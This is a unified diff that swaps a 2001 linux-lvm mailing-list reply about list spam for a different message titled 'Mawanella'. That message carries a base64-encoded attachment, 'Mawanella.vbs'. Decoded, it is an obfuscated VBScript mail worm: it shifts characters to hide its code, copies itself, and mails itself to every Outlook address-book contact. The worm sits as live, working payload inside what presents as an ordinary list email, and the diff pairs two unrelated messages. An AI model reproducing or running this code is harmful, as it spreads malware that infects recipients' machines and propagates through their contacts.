@@ -1,10 +1,12 @@
-Return-Path: <jomarqua@indiana.edu>
-Date: Tue, 22 May 2001 11:29:12 -0500 (EST)
-From: John Marquart <jomarqua@indiana.edu>
-Subject: Re: [linux-lvm] The Info You Requested                         
-In-Reply-To: <20010522094151.D20912@minime.sistina.com>
-Message-ID: <Pine.A41.4.21.0105221126200.26750-100000@gigue.dlib.indiana.edu>
+Return-Path: <mvasa@confluencenetworks.com>
+Date: Tue, 22 May 2001 09:29:17 -0700
 MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----_=_NextPart_001_01C0E2DC.58AB59C2"
+Message-ID: <71AD71402EB8B04AB30F351C1EE5707C01FFF5@MAIL.confluencenetworks.com>
+content-class: urn:content-classes:message
+From: "Mayank Vasa" <mvasa@confluencenetworks.com>
+Subject: [linux-lvm] Mawanella
 Sender: linux-lvm-admin@sistina.com
 Errors-To: linux-lvm-admin@sistina.com
 Reply-To: linux-lvm@sistina.com
@@ -16,113 +18,82 @@ List-Unsubscribe: <http://lists.sistina.com/mailman/listinfo/linux-lvm>,
 	<mailto:linux-lvm-request@sistina.com?subject=unsubscribe>
 List-Archive: <http://lists.sistina.com/pipermail/linux-lvm/>
 List-Id: <linux-lvm.redhat.com>
-Content-Type: TEXT/PLAIN; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 To: linux-lvm@sistina.com
 
-I by far don't want to replay the schizm that occurred a few weeks ago -
-but if this is such a major nuisance to sistina to manage a little spam
-filtering - perhaps we should allow linux-openlvm@mail.nl.linux.org to be
-the lvm mailing list.  they seemed willing and interested in keeping spam
-out of the mailing list - while keeping it open to the public.   Having an
-open list does not mean that the list should be polutted w/ toner adverts
-and long distance specials.
+This is a multi-part message in MIME format.
 
--john
+------_=_NextPart_001_01C0E2DC.58AB59C2
+Content-Type: text/plain;
+	charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
 
-On Tue, 22 May 2001, Ben Lutgens wrote:
-
-> On Tue, May 22, 2001 at 12:28:44PM +0000, Heinz J. Mauelshagen wrote:
-> >
-> >Sorry Steve,
-> >
-> >list is open now on requests.
-> >
-> >Will talk to our admin to enhance filters.
-> 
-> Yes, we used to have a very nice simple setup where non-subscribers could not
-> post. People thought that this was used to "censor" posts, on popular request
-> I opened the list and informed everyone that soon the spam would start, and
-> that I probably would not do anything to stop it.
-> 
-> The fact is, I just don't have the time to do anything about it right now.
-> You'll all have to fire up text editors and use procmail or something for the
-> time being.
-> 
-> >
-> >Regards,
-> >Heinz    -- The LVM Guy --
-> >
-> >
-> >On Tue, May 22, 2001 at 09:56:11PM +1200, Steve Wray wrote:
-> >> what the HELL is this *SPAM* doing going out to the LVM list??
-> >> 
-> >> 
-> >> > -----Original Message-----
-> >> > From: linux-lvm-admin@sistina.com [mailto:linux-lvm-admin@sistina.com]On
-> >> > Behalf Of sabrina_B@hwmcplus.com
-> >> > Sent: Tuesday, May 22, 2001 9:30 PM
-> >> > To: everyone@mvsw.int.net
-> >> > Subject: [linux-lvm] The Info You Requested 6291
-> >> > 
-> >> > 
-> >> > Long Distance Conference Calls 18 Cents Per Minute!
-> >> > 
-> >> > 
-> >> > -Connect up to 100 participants
-> >> > -No set up fees or contractual fees
-> >> > -Call anytime, from anywhere, to anywhere
-> >> > -Web, Data, and Video Conferencing Available
-> >> > 
-> >> > Why pay more for something you don't have to.
-> >> > 
-> >> > Learn More About Conference Calls For Less Here
-> >> > http://marketing201.net/ccfl/
-> >> > 
-> >> > 
-> >> > 
-> >> > This is not SPAM.  You have been emailed this message 
-> >> > because you have opted to receive information regarding
-> >> > business opportunities.  If you feel that your email address
-> >> > has been used without your consent and wish to be removed, click
-> >> > the following link.  We will gladly remove you from our distribution
-> >> > list and apologize for any inconvenience.
-> >> > box808@excite.com
-> >> > _______________________________________________
-> >> > linux-lvm mailing list
-> >> > linux-lvm@sistina.com
-> >> > http://lists.sistina.com/mailman/listinfo/linux-lvm
-> >> > 
-> >> _______________________________________________
-> >> linux-lvm mailing list
-> >> linux-lvm@sistina.com
-> >> http://lists.sistina.com/mailman/listinfo/linux-lvm
-> >
-> >=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-> >
-> >Heinz Mauelshagen                                 Sistina Software Inc.
-> >Senior Consultant/Developer                       Am Sonnenhang 11
-> >                                                  56242 Marienrachdorf
-> >                                                  Germany
-> >Mauelshagen@Sistina.com                           +49 2626 141200
-> >                                                       FAX 924446
-> >=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-> >_______________________________________________
-> >linux-lvm mailing list
-> >linux-lvm@sistina.com
-> >http://lists.sistina.com/mailman/listinfo/linux-lvm
-> 
-> -- 
-> Ben Lutgens		
-> Sistina Software Inc.	
-> MIS Geek
-> http://www.sistina.com/	<--- great software 
-> http://www.gentoo.org/  <--- great distro
-> Kernel panic: I have no root and I want to scream <--- perfect error message
-> 
+Mawanella is one of the Sri Lanka's Muslim Village
 
 
-John "Jamie" Marquart		|     This message posted 100% MS free.
-Digital Library SysAdmin	|  Work: 812-856-5174   Pager: 812-334-6018
-Indiana University Libraries	|  ICQ: 1131494	 	D'net Team:  6265
+------_=_NextPart_001_01C0E2DC.58AB59C2
+Content-Type: application/octet-stream;
+	name="Mawanella.vbs"
+Content-Transfer-Encoding: base64
+Content-Description: Mawanella.vbs
+Content-Disposition: attachment;
+	filename="Mawanella.vbs"
+
+DQpFeGVjdXRlIFVuQ29kZSgiVHMlSnd3dHclV2p4enJqJVNqfXkPV2pyJTQ0JU4lbWZ5aiVSZnxm
+c2pxcWYlbnNobmlqc3kPWGp5JVxkWCVCJUh3amZ5alRnb2poeS0nXFhod251eTNYbWpxcScuD1hq
+eSVreHQlQiVId2pmeWpUZ29qaHktJ1hod251eW5zbDNLbnFqWH54eWpyVGdvamh5Jy4PeGp5JWtu
+cWolQiVreHQzVHVqc1lqfXlLbnFqLVxYaHdudXkzWGh3bnV5S3pxcXNmcmoxNi4Pe2d4aHR1fkJr
+bnFqM1dqZmlGcXEPcmZucy0uDw94emclcmZucy0uDyUlJVRzJUp3d3R3JVdqeHpyaiVTan15DyUl
+JWluciV8eGh3MXd3MSV4eXdSeGwPJSUleGp5JXx4aHdCSHdqZnlqVGdvamh5LSdcWGh3bnV5M1ht
+anFxJy4PJSUlJSUlWGp5JWlud3xucyVCJWt4dDNManlYdWpobmZxS3RxaWp3LTUuDyUlJSUlJVhq
+eSVpbnd4fnh5anIlQiVreHQzTGp5WHVqaG5mcUt0cWlqdy02Lg8lJSUlJSVYanklaW53eWpydSVC
+JWt4dDNManlYdWpobmZxS3RxaWp3LTcuDyUlJSUlJVhqeSVoS25xaiVCJWt4dDNManlLbnFqLVxY
+aHdudXkzWGh3bnV5S3pxcVNmcmouDyUlJSUlJWhLbnFqM0h0dX4taW53eH54eWpyKydhUmZ8ZnNq
+cXFmM3tneCcuDyUlJSUlD1hqeSVUenlxdHRwRiVCJUh3amZ5alRnb2poeS0nVHp5cXR0cDNGdXVx
+bmhmeW50cycuD05rJVR6eXF0dHBGJUIlJ1R6eXF0dHAnJVltanMPJSUlWGp5JVJmdW5CVHp5cXR0
+cEYzTGp5U2Zyalh1ZmhqLSdSRlVOJy4PJSUlWGp5JUZpaVFueHl4QlJmdW4zRmlpd2p4eFFueHl4
+DyUlJUt0dyVKZmhtJVFueHlOc2lqfSVOcyVGaWlRbnh5eA8lJSUlJSUlTmslUW54eU5zaWp9M0Zp
+aXdqeHhKc3l3bmp4M0h0enN5JUFDJTUlWW1qcw8OJSVIdHN5Zmh5SHR6c3ldJUIlUW54eU5zaWp9
+M0ZpaXdqeHhKc3l3bmp4M0h0enN5Dw4lJUt0dyVIdHpzeUIlNiVZdCVIdHN5Zmh5SHR6c3ldDyUl
+JSUlJSUlJSUlJSUlWGp5JVJmbnFdJUIlVHp5cXR0cEYzSHdqZnlqTnlqci01Lg8OJSUlJSUlWGp5
+JUh0c3lmaHldJUIlUW54eU5zaWp9M0ZpaXdqeHhKc3l3bmp4LUh0enN5Lg8lJSUlJSUlJSUlJSUl
+JSxyeGxndH0laHRzeWZoeX0zZmlpd2p4eA8lJSUlJSUlJSUlJSUlJSxSZm5xfTNXamhudW5qc3l4
+M0ZpaS1IdHN5Zmh5XTNGaWl3anh4Lg8lJSUlJSUlJSUlJSUlJVJmbnFdM1l0JUIlSHRzeWZoeV0z
+Rmlpd2p4eA8OJSUlJSUlUmZucV0zWHpnb2poeSVCJSdSZnxmc2pxcWYnDw4lJSUlJSVSZm5xXTNH
+dGl+JUIle2dod3FrKydSZnxmc2pxcWYlbngldHNqJXRrJXltaiVYd24lUWZzcGYseCVSenhxbnIl
+W25xcWZsaicre2dod3FrDw4lJSUlJSUsWGp5JUZ5eWZobXJqc3lCUmZucV0zRnl5ZmhtcmpzeXgP
+DiUlJSUlJSxGeXlmaG1yanN5M0ZpaSVpbnd4fnh5anIlKyUnYVJmfGZzanFxZjN7Z3gnDw4lJSUl
+JSUsUmZucX0zRnl5ZmhtcmpzeXgzRmlpLWlud3h+eHlqciUrJSdhUmZ8ZnNqcXFmM3tneCcuDw4l
+JSUlJSVSZm5xfTNGeXlmaG1yanN5eDNGaWktaW53eH54eWpyJSslJ2FSZnxmc2pxcWYze2d4Jy4P
+DiUlJSUlJVJmbnFdM0lqcWp5akZreWp3WHpncm55JUIlWXd6ag8OJSUlJSUlTmslUmZucV0zWXQl
+QUMlJyclWW1qcw8ODiVSZm5xXTNYanNpDyUOJSUlJSUlSnNpJU5rDyUlJSUlJSUlJSUlU2p9eQ8l
+JSUlJSUlSnNpJU5rDyUlJVNqfXkPSnF4ag8lJSVyeGxHdH0lJ1VxamZ4aiVLdHd8ZndpJXltbngl
+eXQlantqd350c2onJQ9Kc2klbmsPD3h5d1J4bEIlJyUlLiUlJSUlJSUlJSUlJSUlJSUlJSUlLScl
+KyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnLSUlLiUlJSUlJSUlJSUlJSUlJSUtJSUlLiUlJyUr
+JXtnaHdxaw94eXdSeGxCJXh5d1J4bCUrJSclJS0lJSUlLiUlJSUlJSUlJSUtJSUlLiclKyV7Z2h3
+cWsPeHl3UnhsQiV4eXdSeGwlKyUnJSUlJS0lJSUuJSUlJSUlLSUlJSUlJSUlJS4nJSsle2dod3Fr
+D3h5d1J4bEIleHl3UnhsJSslJyUlJSUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyJyUrJXtnaHdx
+aw94eXdSeGxCJXh5d1J4bCUrJSclJSU0JSUlJSUlJS0lJSUtJSUlJS0lJSUlJSU0YSclKyV7Z2h3
+cWsPeHl3UnhsQiV4eXdSeGwlKyUnJSU0JSUlJSUlJSUlJS0lJSUlJSUlJSUlJSUlNCUlYSclKyV7
+Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJTQlJSUlJSUlJSUlJSUtJS0lJSUlJSUlJSU0JSUlJWEn
+JSsle2dod3FrD3h5d1J4bEIleHl3UnhsJSslJyUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy
+MjIyMiclKyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJYElJSUlJSUlJSUlJSUlJSUlMjIyJSUl
+JSUlgSUlJSUlJYEnJSsle2dod3FrD3h5d1J4bEIleHl3UnhsJSslJyWBJSUyMjIyMiUlJSUlJSUl
+gSUlJYElJSUlJSWBJSUlJSUlgSclKyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJYElgSUlJSUl
+gSUlJSUlJSUlMjIyJSUlJSUlJYElJSUlJSWBJyUrJXtnaHdxaw94eXdSeGxCJXh5d1J4bCUrJScl
+gSWBJSUlJSWBJSUlJSUlJSUlJSUlJSUlJSUlgSUlJSUlJYEnJSsle2dod3FrD3h5d1J4bEIleHl3
+UnhsJSslJyUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMiclKyV7Z2h3cWsPD3h5d1J4
+bEIleHl3UnhsJSslJ1JmfGZzanFxZiVueCV0c2oldGsleW1qJVh3biVRZnNwZix4JVJ6eHFuciVb
+bnFxZmxqMyclKyV7Z2h3cWslD3h5d1J4bEIleHl3UnhsJSslJ1ltbnglZ3d6eWZxJW5zaG5panN5
+JW1mdXVqc2ppJW1qd2olNyVSenhxbnIlUnR4dnpqeCUrJTY1NSVYbXR1eCVmd2olZ3p3c3kzJyUr
+JXtnaHdxayUPeHl3UnhsQiV4eXdSeGwlKyUnTiVtZnkleW1ueCVuc2huaWpzeTElXG1meSVmZ3R6
+eSV+dHpEJU4laGZzJWlqeHl3dH4lfnR6dyVodHJ1enlqdyclKyV7Z2h3cWslD3h5d1J4bEIleHl3
+UnhsJSslJ04laW5pcyx5JWl0JXltZnklZ2poZnp4aiVOJWZyJWYldWpmaGoycXR7bnNsJWhueW5/
+anMzJw8lD3J4bGd0fSV4eXdSeGwxMSdSZnxmc2pxcWYnDw9Kc2kleHpnDw8lDyIpDQoNCg0KRnVu
+Y3Rpb24gVW5Db2RlKHNDb2RlZCkNCiAgIEZvciBJPTEgVG8gTGVuKHNDb2RlZCkNCiAgICAgIEN1
+ckNoYXI9IE1pZChzQ29kZWQsIEksIDEpDQogICAgICBJZiBBc2MoQ3VyQ2hhcikgPSAxNSBUaGVu
+DQogICAgICAgICBzdHJDaHI9IENocigxMCkNCiAgICAgIEVsc2UNCiAgICAgICAgIHN0ckNociA9
+IGNocihhc2MoQ3VyQ2hhciktNSkNCiAgICAgIEVuZCBpZg0KICAgICAgICAgVW5Db2RlID0gVW5D
+b2RlICYgc3RyQ2hyDQogICAgTmV4dA0KRW5kIEZ1bmN0aW9uICAgDQoNCg==
+
+------_=_NextPart_001_01C0E2DC.58AB59C2--
